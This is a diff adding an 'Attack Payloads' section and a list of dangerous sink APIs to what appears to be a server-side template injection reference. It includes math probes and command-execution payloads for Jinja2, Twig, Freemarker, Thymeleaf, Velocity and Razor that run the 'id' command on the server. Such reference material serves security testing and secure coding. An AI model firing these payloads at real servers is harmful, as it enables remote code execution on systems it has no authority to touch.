@@ -30,6 +30,109 @@ The unsafe assumption is that template syntax and user data stay in separate lay
 | **Weak controls** | `|safe`, `th:utext`, `@Html.Raw`, `autoescape=False` on user-influenced template source |
 | **Distinction from XSS** | SSTI executes on the server during render; XSS executes in the victim browser |
 
+## Attack Payloads
+
+Use these in authorized tests when user input reaches template source or expression slots. A math probe that returns `49` confirms evaluation. Replace probes with impact payloads only in authorized environments.
+
+### Pattern 1: Detection probes (math evaluation)
+
+```text
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+*{7*7}
+```
+
+### Pattern 2: Jinja2 / Flask
+
+```jinja2
+{{config}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+
+### Pattern 3: Twig (PHP)
+
+```twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+```
+
+### Pattern 4: Freemarker (Java)
+
+```freemarker
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+### Pattern 5: Thymeleaf / Spring
+
+```text
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+### Pattern 6: Pebble / Velocity / Razor-style
+
+```text
+{% set cmd = 'id' %}{% import cmd %}
+#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+@(1+2); System.Diagnostics.Process.Start("cmd.exe","/c id");
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for compile-from-string and expression evaluation in template engines. User data must stay in the data layer, never in template syntax.
+
+### Python (Jinja2)
+
+```python
+Template("Hello {{ " + name + " }}").render()
+env.from_string(user_template).render()
+render_template_string(user_html)
+Environment(autoescape=False).from_string(user_src)
+```
+
+### Java (Thymeleaf / Freemarker / Velocity)
+
+```java
+templateEngine.process(userTemplate, context);
+cfg.getTemplate(userPath).process(data, writer);
+Velocity.evaluate(context, writer, "", userSnippet);
+```
+
+### C# (Razor)
+
+```csharp
+var result = Razor.Parse(userTemplate);
+Engine.Razor.RunCompile(userContent, "dynamic", null, model);
+@Html.Raw(userTemplate)  // when template source is user-controlled
+```
+
+### JavaScript (Handlebars / EJS / Nunjucks)
+
+```javascript
+handlebars.compile(userTemplate)(data);
+ejs.render(userTemplate, data);
+nunjucks.renderString(userTemplate, data);
+```
+
+### Go (text/template vs html/template)
+
+```go
+tmpl, _ := template.New("t").Parse(userTemplate)  // text/template executes code
+tmpl.Execute(w, data)
+```
+
+### HTML (server-side includes with expression engines)
+
+```jsp
+<c:set var="tpl" value="${param.template}"/>
+${userExpression}  <!-- EL evaluated server-side -->
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
